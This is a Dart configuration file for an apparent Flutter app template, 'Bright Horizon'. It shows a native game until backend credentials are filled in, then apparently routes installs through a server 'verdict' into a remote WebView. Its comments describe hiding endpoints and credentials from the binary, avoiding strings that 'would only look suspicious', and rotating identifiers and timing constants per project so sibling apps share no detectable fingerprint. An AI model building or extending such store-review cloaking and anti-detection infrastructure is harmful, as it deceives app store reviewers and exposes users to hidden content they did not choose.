import 'veiled_bytes.dart';

// ============================================================
// RELAY CONFIG — single source of truth for project-wide constants
// ============================================================
// Identity values live here as plain constants (the store listing
// makes them public anyway — encoding them would only look
// suspicious). Every credential / endpoint / UA fragment resolves
// lazily through `unlock*` getters in `veiled_bytes.dart`, so
// plaintext credentials never appear as string literals in the
// compiled binary.
//
// [FORGE] Every field marked with `[FORGE]` is rotated per project by
// `dart run tool/forge/mint.dart`. Never ship two projects with the
// same triplet (`applicationId`, `marketId`, `displayName`), and never
// with a timing constant within 10 % of a shipped sibling's value.
// ============================================================

abstract final class RelayConfig {
  // ─────────────────────────────────────────────────────────
  // Identity (public — matches the store listing)
  // ─────────────────────────────────────────────────────────
  // [FORGE] Must EXACTLY match:
  //   • android/app/build.gradle.kts → applicationId + namespace
  //   • android/app/src/main/kotlin/**/MainActivity.kt package
  //   • android/app/google-services.json → package_name
  //   • android/app/src/main/AndroidManifest.xml → android:label
  //   • pubspec.yaml → name (snake_case slug of displayName)
  static const String applicationId = 'com.sunward.brighthorizon'; // [FORGE]
  static const String marketId = 'com.sunward.brighthorizon'; // [FORGE]
  static const String displayName = 'Bright Horizon'; // [FORGE]

  /// Numeric iOS App Store id. Empty on Android-only builds; the
  /// backend contract treats "" as "unavailable, use the applicationId
  /// as store_id" (see the Config Request contract).
  static const String storeNumericId = '';

  // ─────────────────────────────────────────────────────────
  // Timings — every constant is [FORGE]-rotated
  // ─────────────────────────────────────────────────────────
  // Numeric constants survive `--obfuscate`. The forge rotates each of
  // these to a project-unique value from a range, so no two sibling
  // apps share the same magic number. Do NOT hand-edit — regenerate
  // through `dart run tool/forge/mint.dart`.
  //
  // See `.cursor/rules/portfolio_registry.md` for the ranges and the
  // anti-collision policy.

  /// Snooze after the user taps "Not now" on the permission stage.
  /// 2 days, 23 hours, 5 minutes, 5 seconds.
  /// Range: 172800..604800 (2..7 days).
  static const int permissionSnoozeSeconds = 255905;

  /// Forge timing slot. Range: 4..12 seconds.
  static const int organicRescueDelay = 9;

  /// Verdict POST timeout. Range: 10..25 seconds.
  static const int verdictTimeoutSeconds = 21;

  /// Awaiting install-conversion payload on a first launch.
  /// Range: 20..40 seconds.
  static const int firstInstallAwaitSeconds = 33;

  /// Awaiting install-conversion payload on a returning launch.
  /// Range: 3..10 seconds.
  static const int returningInstallAwaitSeconds = 8;

  /// Deep-link callback wait. Range: 3..8 seconds.
  static const int deepLinkAwaitSeconds = 6;

  /// DNS probe timeout. Range: 4..9 seconds. Keep ≥ 4 s so a slow VPN
  /// tunnel does not produce false offline verdicts (pitfalls §3).
  static const int reachProbeTimeoutSeconds = 8;

  /// Debounce before committing a connectivity-drop signal into the
  /// offline routing. Range: 500..1200 ms.
  static const int reachDropDebounceMs = 1050;

  /// Redirect-loop retries in the WebView on error `-1007` / `-9`.
  /// Range: 1..5. Keep low; a value ≥ 5 is a fingerprint.
  static const int redirectLoopRetries = 3;

  /// Cached verdict URL freshness window. Range: 3..14 days.
  static const int cachedUrlLifetimeSeconds = 734400;

  // ─────────────────────────────────────────────────────────
  // Resolved (encoded) endpoints & credentials
  // ─────────────────────────────────────────────────────────
  static String get endpointUrl => unlockEndpointUrl();
  static String get attributionKey => unlockAttributionKey();
  static String get messagingProjectId => unlockMessagingProject();

  static String get storeId {
    if (storeNumericId.isNotEmpty) return 'id$storeNumericId';
    return marketId;
  }

  /// The routing gate stays disabled — every install lands in the
  /// native game — until all three encoded values are populated. This
  /// is intentional: the project compiles and runs without the
  /// manager's credentials, and QA can smoke-test the game path before
  /// the backend is wired up.
  static bool get credentialsReady =>
      endpointUrl.isNotEmpty &&
      attributionKey.isNotEmpty &&
      messagingProjectId.isNotEmpty;
}
